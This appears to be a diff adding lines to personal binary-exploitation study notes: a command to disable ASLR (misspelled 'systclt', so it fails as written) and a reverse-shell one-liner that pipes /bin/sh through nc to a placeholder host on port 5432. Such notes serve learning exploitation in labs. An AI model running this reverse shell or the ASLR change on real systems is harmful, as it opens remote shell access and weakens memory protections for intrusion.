@@ -12,6 +12,10 @@
    $ sudo chown root victim
    $ sudo chmod +x victim
   ```
+- disabling ASLR for educational pourposes:
+  ```
+  $ sudo systclt -w kernel.randomize_va_space=0
+  ```  
 
 ## GDB
 
@@ -20,6 +24,14 @@
   ~$>gdb program.c
   (gdb) b *main
   (gdb) r < <(printf "some text"; printf "\xsomehex")
+  ```
+  
+## Shellconection
+
+- Shellcode to reverse connect:
+  ```
+  $mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x  5432 > /tmp/f
+
   ```
 
 
